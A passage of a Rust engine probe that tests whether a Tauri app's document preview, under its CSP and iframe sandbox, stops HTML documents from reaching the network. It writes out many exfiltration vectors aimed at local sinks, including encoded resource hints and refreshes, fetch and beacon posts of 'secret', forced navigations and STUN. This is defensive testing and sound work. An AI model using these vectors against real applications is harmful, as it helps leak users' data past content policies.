//! Engine exfil probe: the preview as it ships, in a real engine (ADR-043).
//!
//! `preview::csp`, `tests/app_csp_tests.rs` and the resource-hint tests pin
//! the policy bytes and the document rewrite. Whether an engine enforces them
//! is a different question that only an engine answers. This probe builds the
//! shipped topology in a real webview (WebKit on macOS, WebKit2GTK on Linux,
//! WebView2 on Windows): an app-origin page served under the app CSP the Tauri
//! config merges for this platform, framing the preview document in an iframe
//! that carries the sandbox attribute `PreviewPane.tsx` sets, at the URL the
//! host's preview base gives. The document is rendered by the HTML renderer
//! and served through `handler::resolve_cached`, and every navigation goes
//! through the production guard. Each vector aims at its own local TCP sink,
//! STUN at a UDP sink, and, when the run routes a test domain to it, host
//! names at a DNS sink.
//!
//! Three phases, in one webview:
//! 1. **Scripts off**, every document's default. A corpus of static vectors:
//!    resource hints of every kind (including a hint in a second `rel` after a
//!    stylesheet's or an alternate's, which Chromium's preload scanner reads),
//!    stylesheets, images, fonts, media, frames (one with a repeated `src`,
//!    two with a hint or a refresh in `srcdoc` markup), objects, meta
//!    refreshes (one with an encoded `http-equiv`, one with a repeated one), a
//!    `Link` pragma naming a preconnect, a pragma asking for DNS prefetch back,
//!    an anchor, a base URL, a remote and an inline script.
//!    Asserted: no sink sees a request, the inline script does not run, the
//!    first-party bridge does (it reports ready), and the app page never
//!    navigates.
//! 2. **Scripts on**, a file the user opted in. Its script tries every
//!    navigation it can: `top.location`, self-navigation, link clicks with
//!    each target, an SVG link, an image-map area, `window.open`, a form
//!    submit, a frame it creates and a meta refresh it inserts, plus `fetch`,
//!    `sendBeacon`, a WebSocket and an image. The attempts that leave the
//!    document in its frame share one load of it; each attempt that can move
//!    the frame itself (the form submit, the inserted refresh, the link
//!    without a target, `location.href`) gets a load of its own, so an engine
//!    that moves the frame still sees every attempt. Each load is held for the
//!    settle time before the next one replaces it. Asserted: every load
//!    reports in, every attempt is made, none reaches a sink, every link click
//!    reaches the app as a request to open, and the app page never navigates.
//!    The channels ADR-043 accepts for an opted-in file are reported, not
//!    asserted: STUN, a resource hint the script creates, and on WebView2 the
//!    frame navigations the script starts, whose target the browser layer
//!    connects to before `frame-src` refuses them.
//! 3. **Controls.** The same iframe, at the same origin and under the same
//!    sandbox, loads a document served without the policy, which fires an
//!    image, a preconnect and STUN at fresh sinks. The image has to land, or
//!    something other than the policy keeps this engine from the sinks and
//!    their silence above proves nothing; the other two report whether the
//!    engine acts on them. A page with no policy at `about:blank` fires the
//!    same three, which tells a broken frame apart from unreachable sinks.
//!
//! The probe prints one block per phase, every vector in it with its verdict,
//! on a pass as on a failure; a failure lists the verdicts that failed first.
//!
//! On Windows the probe turns off Chromium's private and local network checks.
//! They stop a public page reaching a loopback address, so they would stop the
//! loopback sinks for a reason no real attacker host meets; with them off the
//! policy is what is measured.
//!
//! A real click with a person's mouse is not something a probe can make, so
//! the scripted clicks of phase 2 stand in for it; the smoke row in ADR-043
//! covers the mouse.
//!
//! It needs a display and the main thread, so the harness is off
//! (`harness = false`) and the probe runs only under `WRIT_ENGINE_PROBE=1`.
//! Unset, it exits 0 without opening a window. `WRIT_ENGINE_PROBE_DNS_DOMAIN`
//! and `WRIT_ENGINE_PROBE_DNS_ADDR` turn on the DNS sink for a run whose
//! resolver sends that domain to that address; the probe then resolves a
//! control name itself first and fails if the sink does not see it, the
//! scripts-off corpus adds two hints, an image, an anchor and a frame by name,
//! none of which may reach the sink, and the in-frame control also loads an
//! image by name, which has to.

#[path = "support/app_csp.rs"]
mod app_csp;

use std::borrow::Cow;
use std::collections::BTreeMap;
use std::net::{SocketAddr, TcpListener, ToSocketAddrs, UdpSocket};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use writ_core::preview::{ContentRenderer, RenderRequest};
use writ_tauri_lib::preview::handler::{resolve_cached, RenderCache, RenderedDoc};
use writ_tauri_lib::preview::renderers::HtmlRenderer;

/// The longest the scripts-off document may take to report ready.
const LOAD_TIMEOUT: Duration = Duration::from_secs(20);
/// Given to each phase once its document is in, for what it set off (a meta
/// refresh, a preconnect, STUN gathering) to reach a sink.
const SETTLE: Duration = Duration::from_secs(3);
/// The gap between two scripts-on attempts in one load. The probe paces them
/// itself: a hidden window's page timers are throttled, more the longer it is
/// hidden.
const STEP_GAP: Duration = Duration::from_millis(300);
/// How long a settled scripts-on load has to answer the probe's ping before
/// the probe records that the frame left the document.
const PING_WAIT: Duration = Duration::from_secs(1);
/// How often the event loop wakes to read what the page reported.
const POLL: Duration = Duration::from_millis(100);
/// The longest refused URL the output prints whole.
const URL_SHOWN: usize = 120;

/// Static vectors in the scripts-off corpus, one sink each.
const OFF_VECTORS: &[&str] = &[
    "preconnect",
    "preconnect-encoded",
    "preconnect-after-stylesheet",
    "preconnect-after-alternate",
    "dns-prefetch",
    "prefetch",
    "preload",
    "modulepreload",
    "prerender",
    "icon",
    "manifest",
    "stylesheet",
    "alternate-stylesheet",
    "alternate",
    "css-import",
    "css-url",
    "font-face",
    "base",
    "script-src",
    "inline-script",
    "meta-refresh",
    "meta-refresh-encoded",
    "meta-refresh-repeated",
    "meta-link-preconnect",
    "img",
    "srcset",
    "picture",
    "video-poster",
    "audio",
    "iframe",
    "iframe-repeated-src",
    "srcdoc-preconnect",
    "srcdoc-refresh",
    "object",
    "embed",
    "inline-style-url",
    "svg-image",
    "input-image",
    "anchor",
];

/// Navigation and fetch vectors the scripts-on corpus fires, one sink each.
const ON_VECTORS: &[&str] = &[
    "fetch",
    "beacon",
    "websocket",
    "script-img",
    "top-location",
    "link-top",
    "link-blank",
    "svg-link",
    "area",
    "window-open",
    "form-submit",
    "script-iframe",
    "meta-refresh-inserted",
    "link-self",
    "self-location",
];

/// The link clicks of the scripts-on corpus, which the bridge must report.
const ON_CLICKS: &[&str] = &["link-top", "link-blank", "svg-link", "area", "link-self"];

/// Channels an opted-in file keeps (ADR-043), reported and not asserted.
const ON_RESIDUAL: &[&str] = &["dynamic-preconnect"];

/// Frame navigations the scripts-on corpus starts. WebView2's browser layer
/// opens a connection to a frame navigation's target before the app's
/// `frame-src` refuses it, a channel ADR-043 accepts for an opted-in file, so
/// on Windows these are reported; on WebKit they are asserted.
const ON_FRAME_NAVIGATIONS: &[&str] = &["script-iframe", "meta-refresh-inserted", "self-location"];

/// The loads of the scripts-on document and the attempts each one makes, in
/// order. The attempts that leave the document in its frame share the first
/// load. Each attempt that can move the frame itself has a load of its own, so
/// an engine that moves the frame cannot keep the attempts after it from
/// being made.
const ON_LOADS: &[&[&str]] = &[
    &[
        "fetch",
        "beacon",
        "websocket",
        "script-img",
        "stun",
        "dynamic-preconnect",
        "top-location",
        "link-top",
        "link-blank",
        "svg-link",
        "area",
        "window-open",
        "script-iframe",
    ],
    &["form-submit"],
    &["meta-refresh-inserted"],
    &["link-self"],
    &["self-location"],
];

const CONTROL_VECTORS: &[&str] = &[
    "control-frame-img",
    "control-frame-preconnect",
    "control-img",
    "control-preconnect",
];

/// The buffer id the probe serves its in-frame control under, without the
/// policy, outside `resolve_cached`.
const CONTROL_DOCUMENT: &str = "control";

fn main() {
    if std::env::var("WRIT_ENGINE_PROBE").ok().as_deref() != Some("1") {
        println!(
            "engine_probe: skipped (set WRIT_ENGINE_PROBE=1 with a display to run the real probe)"
        );
        return;
    }
    match run() {
        Ok(report) => println!("engine_probe: PASS\n{report}"),
        Err(err) => {
            eprintln!("engine_probe: FAIL\n{err}");
            std::process::exit(1);
        }
    }
}

/// Every local sink and what reached it. TCP and UDP sinks count arrivals; the
/// DNS sink records the names it was asked for.
struct Sinks {
    tcp: BTreeMap<String, u16>,
    udp: BTreeMap<String, u16>,
    hits: Arc<Mutex<BTreeMap<String, usize>>>,
    dns: Option<DnsSink>,
}

struct DnsSink {
    domain: String,
    nonce: String,
    names: Arc<Mutex<Vec<String>>>,
}

impl DnsSink {
    fn name(&self, label: &str) -> String {
        format!("{label}.{}.{}", self.nonce, self.domain)
    }

    fn queried(&self) -> Vec<String> {
        self.names.lock().expect("dns names").clone()
    }
}

impl Sinks {
    fn url(&self, vector: &str) -> String {
        format!("http://127.0.0.1:{}/{vector}", self.tcp[vector])
    }

    fn hits(&self, vector: &str) -> usize {
        self.hits
            .lock()
            .expect("hits")
            .get(vector)
            .copied()
            .unwrap_or(0)
    }
}

fn open_sinks() -> Result<Sinks, String> {
    let mut listeners = Vec::new();
    let mut tcp = BTreeMap::new();
    for vector in OFF_VECTORS
        .iter()
        .chain(ON_VECTORS)
        .chain(ON_RESIDUAL)
        .chain(CONTROL_VECTORS)
    {
        let listener = TcpListener::bind("127.0.0.1:0").map_err(|e| format!("bind tcp: {e}"))?;
        listener
            .set_nonblocking(true)
            .map_err(|e| format!("nonblocking tcp: {e}"))?;
        let port = listener.local_addr().map_err(|e| e.to_string())?.port();
        tcp.insert((*vector).to_string(), port);
        listeners.push(((*vector).to_string(), listener));
    }
    let mut sockets = Vec::new();
    let mut udp = BTreeMap::new();
    for name in ["stun", "control-frame-stun", "control-stun"] {
        let socket = UdpSocket::bind("127.0.0.1:0").map_err(|e| format!("bind udp: {e}"))?;
        socket
            .set_nonblocking(true)
            .map_err(|e| format!("nonblocking udp: {e}"))?;
        udp.insert(
            name.to_string(),
            socket.local_addr().map_err(|e| e.to_string())?.port(),
        );
        sockets.push((name.to_string(), socket));
    }

    let hits = Arc::new(Mutex::new(BTreeMap::new()));
    {
        let hits = hits.clone();
        std::thread::spawn(move || {
            let mut buf = [0u8; 1500];
            loop {
                for (vector, listener) in &listeners {
                    while listener.accept().is_ok() {
                        *hits
                            .lock()
                            .expect("hits")
                            .entry(vector.clone())
                            .or_insert(0) += 1;
                    }
                }
                for (name, socket) in &sockets {
                    while socket.recv_from(&mut buf).is_ok() {
                        *hits.lock().expect("hits").entry(name.clone()).or_insert(0) += 1;
                    }
                }
                std::thread::sleep(Duration::from_millis(10));
            }
        });
    }

    Ok(Sinks {
        tcp,
        udp,
        hits,
        dns: open_dns_sink()?,
    })
}

/// The DNS sink, when the run routes a domain to it. It answers every query
/// with NXDOMAIN so a resolver does not retry, and keeps the names asked for.
fn open_dns_sink() -> Result<Option<DnsSink>, String> {
    let setting = |key: &str| {
        std::env::var(key)
            .ok()
            .filter(|value| !value.trim().is_empty())
    };
    let (Some(domain), Some(addr)) = (
        setting("WRIT_ENGINE_PROBE_DNS_DOMAIN"),
        setting("WRIT_ENGINE_PROBE_DNS_ADDR"),
    ) else {
        return Ok(None);
    };
    let addr: SocketAddr = addr
        .parse()
        .map_err(|e| format!("WRIT_ENGINE_PROBE_DNS_ADDR {addr}: {e}"))?;
    let socket = UdpSocket::bind(addr).map_err(|e| format!("bind the DNS sink on {addr}: {e}"))?;
    let names = Arc::new(Mutex::new(Vec::new()));
    {
        let names = names.clone();
        std::thread::spawn(move || {
            let mut buf = [0u8; 1500];
            while let Ok((len, from)) = socket.recv_from(&mut buf) {
                let query = &buf[..len];
                if let Some((name, question_end)) = dns_question(query) {
                    names
                        .lock()
                        .expect("dns names")
                        .push(name.to_ascii_lowercase());
                    let mut answer = query[..question_end].to_vec();
                    // QR, the opcode and RD echoed, RA set, RCODE 3 (NXDOMAIN);
                    // one question, no records.
                    answer[2] = 0x80 | (query[2] & 0x79);
                    answer[3] = 0x80 | 0x03;
                    answer[6..12].fill(0);
                    let _ = socket.send_to(&answer, from);
                }
            }
        });
    }
    let nonce = format!(
        "p{}{}",
        std::process::id(),
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_millis() % 1_000_000)
            .unwrap_or(0)
    );
    Ok(Some(DnsSink {
        domain: domain.trim_matches('.').to_ascii_lowercase(),
        nonce,
        names,
    }))
}

/// The first question's name and where the question section ends.
fn dns_question(packet: &[u8]) -> Option<(String, usize)> {
    if packet.len() < 12 || u16::from_be_bytes([packet[4], packet[5]]) == 0 {
        return None;
    }
    let mut at = 12;
    let mut labels = Vec::new();
    loop {
        let len = *packet.get(at)? as usize;
        at += 1;
        if len == 0 {
            break;
        }
        if len > 63 {
            return None;
        }
        labels.push(String::from_utf8_lossy(packet.get(at..at + len)?).into_owned());
        at += len;
    }
    // QTYPE and QCLASS.
    let end = at + 4;
    (end <= packet.len()).then(|| (labels.join("."), end))
}

/// The value `PreviewPane.tsx` gives the preview iframe's `sandbox` attribute.
fn shipped_sandbox() -> Result<String, String> {
    let source = include_str!("../../src/components/Preview/PreviewPane.tsx");
    let start = source
        .find("sandbox=\"")
        .ok_or("PreviewPane.tsx sets no sandbox attribute on the iframe")?
        + "sandbox=\"".len();
    let end = source[start..]
        .find('"')
        .ok_or("the sandbox attribute in PreviewPane.tsx is not closed")?;
    Ok(source[start..start + end].to_string())
}

fn render(corpus: &str) -> Result<String, String> {
    HtmlRenderer
        .render(RenderRequest {
            content_type: HtmlRenderer::content_type_id(),
            buffer_text: corpus.to_string(),
            theme: Default::default(),
            zoom: 1.0,
            assets: None,
        })
        .map(|out| out.document_html)
        .map_err(|e| format!("the HTML renderer refused the corpus: {e}"))
}

fn off_corpus(sinks: &Sinks) -> String {
    let u = |vector: &str| sinks.url(vector);
    let dns = sinks
        .dns
        .as_ref()
        .map(|dns| {
            format!(
                "<link rel=\"dns-prefetch\" href=\"//{}\">\n\
                 <link rel=\"preconnect\" href=\"http://{}:{}\">\n\
                 <img src=\"http://{}:{}/\" alt=\"\">\n\
                 <a href=\"http://{}:{}/\">anchor by name</a>\n\
                 <iframe src=\"http://{}:{}/\"></iframe>\n",
                dns.name("dns-prefetch"),
                dns.name("preconnect"),
                sinks.tcp["preconnect"],
                dns.name("img"),
                sinks.tcp["img"],
                dns.name("anchor"),
                sinks.tcp["anchor"],
                dns.name("iframe"),
                sinks.tcp["iframe"],
            )
        })
        .unwrap_or_default();
    format!(
        r#"<!doctype html>
<html><head><meta charset="utf-8"><title>probe</title>
<link rel="preconnect" href="{preconnect}">
<LINK REL="PRE&#x43;ONNECT" HREF="{preconnect_encoded}">
<link rel="stylesheet" rel="preconnect" href="{preconnect_after_stylesheet}">
<link rel="alternate" rel="preconnect" href="{preconnect_after_alternate}">
<link rel="dns-prefetch" href="{dns_prefetch}">
<link rel="prefetch" href="{prefetch}">
<link rel="preload" as="image" href="{preload}">
<link rel="modulepreload" href="{modulepreload}">
<link rel="prerender" href="{prerender}">
<link rel="icon" href="{icon}">
<link rel="manifest" href="{manifest}">
<link rel="stylesheet" href="{stylesheet}">
<link rel="alternate stylesheet" title="alt" href="{alternate_stylesheet}">
<link rel="alternate" type="application/rss+xml" href="{alternate}">
<style>@import url("{css_import}"); body {{ background-image: url("{css_url}") }} @font-face {{ font-family: probe; src: url("{font_face}") }} p {{ font-family: probe }}</style>
<base href="{base}/">
<script src="{script_src}"></script>
<script>parent.postMessage({{ probe: "inline-ran" }}, "*"); new Image().src = "{inline_script}";</script>
<meta http-equiv="refresh" content="0;url={meta_refresh}">
<meta http-equiv="&#x52;efresh" content="0;url={meta_refresh_encoded}">
<meta http-equiv="refresh" http-equiv="content-type" content="0;url={meta_refresh_repeated}">
<meta http-equiv="Link" content="<{meta_link_preconnect}>; rel=preconnect">
<meta http-equiv="x-dns-prefetch-control" content="on">
</head><body>
<p>probe document</p>
<img src="{img}" alt="">
<img srcset="{srcset} 1x" alt="">
<picture><source srcset="{picture}"><img alt=""></picture>
<video poster="{video_poster}"></video>
<audio src="{audio}" autoplay></audio>
<iframe src="{iframe}"></iframe>
<iframe SRC="{iframe_repeated_src}" src="about:blank"></iframe>
<iframe srcdoc="&lt;link rel=preconnect href=&quot;{srcdoc_preconnect}&quot;&gt;"></iframe>
<iframe srcdoc="&lt;meta http-equiv=refresh content=&quot;0;url={srcdoc_refresh}&quot;&gt;"></iframe>
<object data="{object}"></object>
<embed src="{embed}">
<div style="background-image: url('{inline_style_url}')">x</div>
<svg width="10" height="10"><image href="{svg_image}" width="10" height="10"/></svg>
<input type="image" src="{input_image}" alt="">
<img src="relative-under-base.png" alt="">
<a href="{anchor}">anchor</a>
{dns}</body></html>
"#,
        preconnect = u("preconnect"),
        preconnect_encoded = u("preconnect-encoded"),
        preconnect_after_stylesheet = u("preconnect-after-stylesheet"),
        preconnect_after_alternate = u("preconnect-after-alternate"),
        dns_prefetch = u("dns-prefetch"),
        prefetch = u("prefetch"),
        preload = u("preload"),
        modulepreload = u("modulepreload"),
        prerender = u("prerender"),
        icon = u("icon"),
        manifest = u("manifest"),
        stylesheet = u("stylesheet"),
        alternate_stylesheet = u("alternate-stylesheet"),
        alternate = u("alternate"),
        css_import = u("css-import"),
        css_url = u("css-url"),
        font_face = u("font-face"),
        base = u("base"),
        script_src = u("script-src"),
        inline_script = u("inline-script"),
        meta_refresh = u("meta-refresh"),
        meta_refresh_encoded = u("meta-refresh-encoded"),
        meta_refresh_repeated = u("meta-refresh-repeated"),
        meta_link_preconnect = u("meta-link-preconnect"),
        img = u("img"),
        srcset = u("srcset"),
        picture = u("picture"),
        video_poster = u("video-poster"),
        audio = u("audio"),
        iframe = u("iframe"),
        iframe_repeated_src = u("iframe-repeated-src"),
        srcdoc_preconnect = u("srcdoc-preconnect"),
        srcdoc_refresh = u("srcdoc-refresh"),
        object = u("object"),
        embed = u("embed"),
        inline_style_url = u("inline-style-url"),
        svg_image = u("svg-image"),
        input_image = u("input-image"),
        anchor = u("anchor"),
    )
}

fn on_corpus(sinks: &Sinks) -> String {
    let u = |vector: &str| sinks.url(vector);
    format!(
        r##"<!doctype html>
<html><head><meta charset="utf-8"><title>probe</title></head><body>
<a id="link-self" href="{link_self}">self</a>
<a id="link-top" href="{link_top}" target="_top">top</a>
<a id="link-blank" href="{link_blank}" target="_blank">blank</a>
<svg width="20" height="20"><a id="svg-link" href="{svg_link}" target="_blank"><rect width="20" height="20"/></a></svg>
<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" usemap="#m" alt="">
<map name="m"><area id="area" shape="rect" coords="0,0,1,1" href="{area}" target="_blank"></map>
<form id="form" action="{form_submit}" method="post"><input name="d" value="secret"></form>
<script>
var thisLoad = new URLSearchParams(location.search).get("load");
parent.postMessage({{ probe: "inline-ran", load: thisLoad }}, "*");
function click(id) {{
  document.getElementById(id).dispatchEvent(new MouseEvent("click", {{ bubbles: true, cancelable: true }}));
}}
var steps = {{
  "fetch": function () {{ fetch("{fetch}", {{ method: "POST", body: "secret" }}).catch(function () {{}}); }},
  "beacon": function () {{ navigator.sendBeacon("{beacon}", "secret"); }},
  "websocket": function () {{ new WebSocket("{websocket}".replace("http:", "ws:")); }},
  "script-img": function () {{ new Image().src = "{script_img}"; }},
  "stun": function () {{
    var pc = new RTCPeerConnection({{ iceServers: [{{ urls: "stun:127.0.0.1:{stun}" }}] }});
    pc.createDataChannel("x");
    pc.createOffer().then(function (o) {{ return pc.setLocalDescription(o); }}).catch(function () {{}});
  }},
  "dynamic-preconnect": function () {{
    var hint = document.createElement("link");
    hint.rel = "preconnect";
    hint.href = "{dynamic_preconnect}";
    document.head.appendChild(hint);
  }},
  "top-location": function () {{ top.location = "{top_location}"; }},
  "link-top": function () {{ click("link-top"); }},
  "link-blank": function () {{ click("link-blank"); }},
  "svg-link": function () {{ click("svg-link"); }},
  "area": function () {{ click("area"); }},
  "window-open": function () {{ window.open("{window_open}"); }},
  "form-submit": function () {{ document.getElementById("form").submit(); }},
  "script-iframe": function () {{
    var frame = document.createElement("iframe");
    frame.src = "{script_iframe}";
    document.body.appendChild(frame);
  }},
  "meta-refresh-inserted": function () {{
    var refresh = document.createElement("meta");
    refresh.httpEquiv = "refresh";
    refresh.content = "0;url={meta_refresh_inserted}";
    document.head.appendChild(refresh);
  }},
  "link-self": function () {{ click("link-self"); }},
  "self-location": function () {{ location.href = "{self_location}"; }}
}};
window.addEventListener("load", function () {{
  parent.postMessage({{ probe: "load-ready", load: thisLoad }}, "*");
}});
window.addEventListener("message", function (event) {{
  var data = event.data || {{}};
  if (data.probe === "ping") {{
    parent.postMessage({{ probe: "pong", load: thisLoad }}, "*");
    return;
  }}
  if (data.probe !== "step" || typeof data.vector !== "string") return;
  if (!Object.prototype.hasOwnProperty.call(steps, data.vector)) {{
    parent.postMessage({{ probe: "unknown-step", vector: data.vector, load: thisLoad }}, "*");
    return;
  }}
  parent.postMessage({{ probe: "attempt", vector: data.vector, load: thisLoad }}, "*");
  try {{ steps[data.vector](); }} catch (e) {{}}
}});
</script>
</body></html>
"##,
        link_self = u("link-self"),
        link_top = u("link-top"),
        link_blank = u("link-blank"),
        svg_link = u("svg-link"),
        area = u("area"),
        form_submit = u("form-submit"),
        fetch = u("fetch"),
        beacon = u("beacon"),
        websocket = u("websocket"),
        script_img = u("script-img"),
        stun = sinks.udp["stun"],
        dynamic_preconnect = u("dynamic-preconnect"),
        top_location = u("top-location"),
        window_open = u("window-open"),
        script_iframe = u("script-iframe"),
        meta_refresh_inserted = u("meta-refresh-inserted"),
        self_location = u("self-location"),
    )
}

/// The in-frame control: what the corpus could reach if the policy and the
/// rewrite were not there.
fn control_document(sinks: &Sinks) -> String {
    let dns = sinks
        .dns
        .as_ref()
        .map(|dns| {
            format!(
                "<img src=\"http://{}:{}/\" alt=\"\">",
                dns.name("control-frame-img"),
                sinks.tcp["control-frame-img"]
            )
        })
        .unwrap_or_default();
    format!(
        r#"<!doctype html>
<html><head><meta charset="utf-8"><link rel="preconnect" href="{preconnect}"></head><body>
<img src="{img}" alt="">{dns}
<script>
parent.postMessage({{ probe: "control-ran" }}, "*");
try {{
  var pc = new RTCPeerConnection({{ iceServers: [{{ urls: "stun:127.0.0.1:{stun}" }}] }});
  pc.createDataChannel("x");
  pc.createOffer().then(function (o) {{ return pc.setLocalDescription(o); }}).catch(function () {{}});
}} catch (e) {{}}
</script>
</body></html>
"#,
        preconnect = sinks.url("control-frame-preconnect"),
        img = sinks.url("control-frame-img"),
        stun = sinks.udp["control-frame-stun"],
    )
}

fn control_page(sinks: &Sinks) -> String {
    let dns = sinks
        .dns
        .as_ref()
        .map(|dns| {
            format!(
                "<img src=\"http://{}:{}/\" alt=\"\">",
                dns.name("control-img"),
                sinks.tcp["control-img"]
            )
        })
        .unwrap_or_default();
    format!(
        r#"<!doctype html>
<html><head><meta charset="utf-8"><link rel="preconnect" href="{preconnect}"></head><body>
<img src="{img}" alt="">{dns}
<script>
try {{
  var pc = new RTCPeerConnection({{ iceServers: [{{ urls: "stun:127.0.0.1:{stun}" }}] }});
  pc.createDataChannel("x");
  pc.createOffer().then(function (o) {{ return pc.setLocalDescription(o); }}).catch(function () {{}});
}} catch (e) {{}}
</script>
</body></html>
"#,
        preconnect = sinks.url("control-preconnect"),
        img = sinks.url("control-img"),
        stun = sinks.udp["control-stun"],
    )
}

/// The page the app origin serves: the preview iframe as `PreviewPane` builds
/// it, on the scripts-off document, and a script that relays what the frame
/// posts to the probe and, when the probe asks, loads the scripts-on document
/// in the frame again, passes the frame an attempt to make or a ping, and
/// moves the frame to the control.
fn parent_page(sandbox: &str, off_src: &str) -> String {
    format!(
        "<!doctype html><html><head><meta charset=\"utf-8\"><script src=\"/parent.js\"></script></head>\
         <body><iframe id=\"preview\" sandbox=\"{sandbox}\" src=\"{off_src}\"></iframe></body></html>"
    )
}

fn parent_script(on_src: &str, control_src: &str) -> String {
    format!(
        r#"(function () {{
  var phase = "off";
  function send(message) {{ try {{ window.ipc.postMessage(JSON.stringify(message)); }} catch (e) {{}} }}
  window.addEventListener("message", function (event) {{
    var data = event.data || {{}};
    send({{
      kind: "frame",
      phase: phase,
      probe: data.probe || null,
      type: data.type || null,
      href: data.href || null,
      vector: data.vector || null,
      load: typeof data.load === "string" ? data.load : null
    }});
  }});
  function frame() {{ return document.getElementById("preview"); }}
  window.__writProbe = {{
    scriptsOn: function (load) {{
      phase = "on";
      frame().src = "{on_src}&load=" + load;
    }},
    step: function (vector) {{
      frame().contentWindow.postMessage({{ probe: "step", vector: vector }}, "*");
    }},
    ping: function () {{
      frame().contentWindow.postMessage({{ probe: "ping" }}, "*");
    }},
    control: function () {{
      phase = "control";
      frame().src = "{control_src}";
    }},
    report: function () {{ send({{ kind: "final", href: location.href }}); }}
  }};
}})();
"#
    )
}

/// One message the frame posted to the app page.
struct FrameMessage {
    phase: String,
    probe: Option<String>,
    kind: Option<String>,
    href: Option<String>,
    vector: Option<String>,
    /// The scripts-on load that posted it, read from that load's URL.
    load: Option<usize>,
}

/// What the app page relayed over IPC.
#[derive(Default)]
struct Reports {
    frame: Vec<FrameMessage>,
    /// `location.href` of the top-level page when the probe asked last.
    final_href: Option<String>,
}

impl Reports {
    fn has(&self, phase: &str, probe: Option<&str>, kind: Option<&str>) -> bool {
        self.frame.iter().any(|m| {
            m.phase == phase
                && (probe.is_none() || m.probe.as_deref() == probe)
                && (kind.is_none() || m.kind.as_deref() == kind)
        })
    }

    fn load_has(&self, load: usize, probe: &str) -> bool {
        self.frame
            .iter()
            .any(|m| m.load == Some(load) && m.probe.as_deref() == Some(probe))
    }

    fn attempt(&self, vector: &str) -> Option<&FrameMessage> {
        self.frame
            .iter()
            .find(|m| m.probe.as_deref() == Some("attempt") && m.vector.as_deref() == Some(vector))
    }

    /// Attempts the probe asked for that the scripts-on document has no step
    /// for.
    fn unknown_steps(&self) -> Vec<&str> {
        self.frame
            .iter()
            .filter(|m| m.probe.as_deref() == Some("unknown-step"))
            .filter_map(|m| m.vector.as_deref())
            .collect()
    }

    fn opened(&self, href: &str) -> bool {
        self.frame
            .iter()
            .any(|m| m.kind.as_deref() == Some("link:open") && m.href.as_deref() == Some(href))
    }
}

fn record_report(reports: &Mutex<Reports>, body: &str) {
    let Ok(message) = serde_json::from_str::<serde_json::Value>(body) else {
        return;
    };
    let text = |key: &str| message[key].as_str().map(str::to_string);
    let mut reports = reports.lock().expect("reports");
    match message["kind"].as_str() {
        Some("frame") => reports.frame.push(FrameMessage {
            phase: text("phase").unwrap_or_default(),
            probe: text("probe"),
            kind: text("type"),
            href: text("href"),
            vector: text("vector"),
            load: text("load").and_then(|load| load.parse().ok()),
        }),
        Some("final") => reports.final_href = text("href"),
        _ => {}
    }
}

/// Where the run is. Each stage waits on what the page reports or on the
/// probe's own clock, never on a timer inside the page: a hidden window's page
/// timers are throttled.
enum Stage {
    AwaitOffReady {
        deadline: Instant,
    },
    OffSettle {
        until: Instant,
    },
    AwaitLoad {
        load: usize,
        deadline: Instant,
    },
    Attempt {
        load: usize,
        step: usize,
        at: Instant,
    },
    LoadSettle {
        load: usize,
        until: Instant,
    },
    AwaitPong {
        load: usize,
        deadline: Instant,
    },
    AwaitControl {
        deadline: Instant,
    },
    ControlSettle {
        until: Instant,
    },
    Report {
        until: Instant,
    },
    BlankControl {
        until: Instant,
    },
}

/// Every scripts-on vector is attempted in exactly one load.
fn check_on_loads() -> Result<(), String> {
    let mut planned: Vec<&str> = ON_LOADS
        .iter()
        .flat_map(|load| load.iter().copied())
        .collect();
    let mut vectors: Vec<&str> = ON_VECTORS
        .iter()
        .chain(ON_RESIDUAL)
        .copied()
        .chain(["stun"])
        .collect();
    planned.sort_unstable();
    vectors.sort_unstable();
    if planned == vectors {
        Ok(())
    } else {
        Err(format!(
            "the scripts-on loads attempt {planned:?}; they have to attempt each of {vectors:?} once"
        ))
    }
}

fn run() -> Result<String, String> {
    use tao::event_loop::{ControlFlow, EventLoopBuilder};
    use tao::platform::run_return::EventLoopExtRunReturn;
    use tao::window::WindowBuilder;
    use wry::WebViewBuilder;

    check_on_loads()?;
    let windows = cfg!(target_os = "windows");
    let sinks = open_sinks()?;

    // DNS routing is checked before anything else: a resolver that never
    // reaches the sink would make the DNS assertions vacuous.
    if let Some(dns) = &sinks.dns {
        let control = dns.name("control");
        let _ = (control.as_str(), 80).to_socket_addrs();
        let deadline = Instant::now() + Duration::from_secs(5);
        while !dns.queried().contains(&control) {
            if Instant::now() >= deadline {
                return Err(format!(
                    "the DNS sink never saw {control}: the run does not route {} to it",
                    dns.domain
                ));
            }
            std::thread::sleep(Duration::from_millis(50));
        }
    }

    let prefix = writ_tauri_lib::commands::preview::preview_url_prefix();
    let off_src = format!("{prefix}document/off?v=1");
    let on_src = format!("{prefix}document/on?v=1");
    let control_src = format!("{prefix}document/{CONTROL_DOCUMENT}?v=1");
    let sandbox = shipped_sandbox()?;
    let app_csp = app_csp::app_csp_for(windows);

    let cache = Arc::new(RenderCache::new());
    cache.put(
        "off",
        RenderedDoc {
            html: render(&off_corpus(&sinks))?,
            assets: None,
            scripts_enabled: false,
        },
    );
    cache.put(
        "on",
        RenderedDoc {
            html: render(&on_corpus(&sinks))?,
            assets: None,
            scripts_enabled: true,
        },
    );

    let reports = Arc::new(Mutex::new(Reports::default()));
    // What the guard refused, each with the part of the run it refused it in.
    let refused = Arc::new(Mutex::new(Vec::<(String, String)>::new()));
    let moment = Arc::new(Mutex::new("scripts off".to_string()));

    let mut event_loop = EventLoopBuilder::new().build();
    #[cfg(target_os = "macos")]
    {
        // A probe window must never take focus from whoever is at the machine.
        use tao::platform::macos::{ActivationPolicy, EventLoopExtMacOS};
        event_loop.set_activation_policy(ActivationPolicy::Accessory);
        event_loop.set_dock_visibility(false);
        event_loop.set_activate_ignoring_other_apps(false);
    }
    let window = WindowBuilder::new()
        .with_visible(false)
        .with_title("writ engine probe")
        .build(&event_loop)
        .map_err(|e| e.to_string())?;

    let parent_html = parent_page(&sandbox, &off_src);
    let parent_js = parent_script(&on_src, &control_src);
    let control_body = control_document(&sinks);
    let preview_cache = cache.clone();
    let ipc_reports = reports.clone();
    let nav_refused = refused.clone();
    let nav_moment = moment.clone();
    let builder = WebViewBuilder::new()
        .with_custom_protocol("tauri".to_string(), move |_id, request| {
            let (status, content_type, body): (u16, &str, Vec<u8>) = match request.uri().path() {
                "/" | "/index.html" => (
